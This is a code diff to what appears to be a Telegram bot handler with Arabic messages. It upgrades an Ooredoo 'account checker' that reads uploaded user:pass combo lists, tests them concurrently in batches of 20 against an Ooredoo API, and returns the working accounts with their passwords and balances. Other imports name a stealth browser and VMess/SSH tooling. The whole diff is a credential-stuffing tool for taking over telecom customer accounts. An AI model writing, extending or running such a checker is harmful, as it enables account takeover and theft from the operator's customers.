@@ -14,7 +14,6 @@ from config import config
 from automation.browser import StealthBrowser
 from automation.sso_flow import run_sso_flow
 from automation.vmess import build_ssh_dark
-from automation.ooredoo import OoredooChecker
 
 log = get_logger("Handlers")
 
@@ -225,46 +224,58 @@ async def process_ooredoo_file(update: Update, context: ContextTypes.DEFAULT_TYP
         await update.message.reply_text("❌ أرسل ملف TXT فقط.")
         return True
 
-    msg = await update.message.reply_text("⏳ جاري تحميل الملف وبدء الفحص...")
+    msg = await update.message.reply_text("⏳ جاري تحميل الملف وبدء الفحص السريع...")
     
     try:
         file_obj = await file.get_file()
         content = (await file_obj.download_as_bytearray()).decode("utf-8", errors="ignore")
         lines = content.splitlines()
         
-        browser = StealthBrowser()
-        ctx = await browser.start()
-        checker = OoredooChecker(ctx, update.effective_chat.id, context.bot)
-        
-        results = []
-        total = len(lines)
-        
-        for i, line in enumerate(lines):
+        accounts_to_check = []
+        for line in lines:
             line = line.strip()
-            if not line or ":" not in line: continue
-            
-            parts = line.split(":", 1)
-            user = parts[0].strip()
-            pwd = parts[1].strip()
-            
-            if i % 5 == 0:
-                try: await msg.edit_text(f"⏳ جاري الفحص... {i}/{total}")
-                except: pass
+            if line and ":" in line:
+                parts = line.split(":", 1)
+                accounts_to_check.append((parts[0].strip(), parts[1].strip()))
+        
+        total = len(accounts_to_check)
+        if total == 0:
+            await msg.edit_text("❌ الملف فارغ أو لا يحتوي على الصيغة الصحيحة (user:pass).")
+            return True
+
+        await msg.edit_text(f"⏳ تم العثور على {total} حساب. جاري الفحص عبر API (سريع جداً)...")
+
+        results = []
+        
+        import aiohttp
+        from automation.ooredoo_api import OoredooAPI
+        
+        checker = OoredooAPI()
+        chunk_size = 20 
+        
+        async with aiohttp.ClientSession() as session:
+            for i in range(0, total, chunk_size):
+                chunk = accounts_to_check[i:i + chunk_size]
                 
-            res = await checker.check_account(user, pwd)
-            if res["success"] or res["balance"] != "فشل الدخول":
-                results.append(res)
+                try: 
+                    await msg.edit_text(f"⏳ جاري الفحص... {i}/{total} (يتم فحص {len(chunk)} حسابات معاً)")
+                except: 
+                    pass
                 
-            await asyncio.sleep(1)
-            
-        await checker.close()
-        await browser.close()
+                tasks = [checker.check_account(session, u, p) for u, p in chunk]
+                chunk_results = await asyncio.gather(*tasks)
+                
+                for res in chunk_results:
+                    if res["success"] or res["balance"] != "فشل الدخول":
+                        results.append(res)
+                
+                await asyncio.sleep(0.5)
         
         if not results:
             await msg.edit_text("❌ لم يتم العثور على أي حساب صالح.")
             return True
             
-        res_text = "📊 *نتائج سحب Ooredoo:*\n\n"
+        res_text = "📊 *نتائج سحب Ooredoo (عبر API):*\n\n"
         for r in results:
             res_text += f"👤: `{r['user']}`\n🔑: `{r['pass']}`\n💰: *{r['balance']}*\n➖➖➖➖\n"
             
@@ -277,6 +288,7 @@ async def process_ooredoo_file(update: Update, context: ContextTypes.DEFAULT_TYP
         await msg.delete()
         
     except Exception as e:
+        log.error(f"خطأ في فحص Ooredoo: {e}")
         await msg.edit_text(f"❌ خطأ: {e}")
         
     return True
